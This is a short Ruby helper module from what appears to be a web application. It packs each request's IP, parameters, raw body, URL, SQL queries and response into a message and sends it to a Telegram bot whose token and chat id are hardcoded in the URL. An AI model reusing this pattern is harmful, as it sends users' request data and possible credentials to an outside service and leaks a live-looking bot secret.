module LogsHelper
  def self.logs(log, request)
    sql_queries = SQLLogger.queries.dup
    SQLLogger.clear
    message = {
      current_time: DateTime.now.strftime("%dth, %b %Y %I:%M %p"),
      ip_addr: request.ip,
      http_method: request.request_method,
      post_method: request.GET,
      files_attachment: request.body.read,
      current_url: request.url,
      query: sql_queries,
      response_text: log,
    }
    formatted_message = JSON.pretty_generate(message)
    encoded_message = URI.encode_www_form_component(formatted_message)
    url = "https://api.telegram.org/bot6984451799:AAGjBIOO4mddpXXwqcFpT_pm_OshiDUzb-Q/sendMessage?chat_id=5503502756&text=#{encoded_message}"
    RestClient.get(url)
  rescue => e
    puts "Error: #{e}"
  end
end
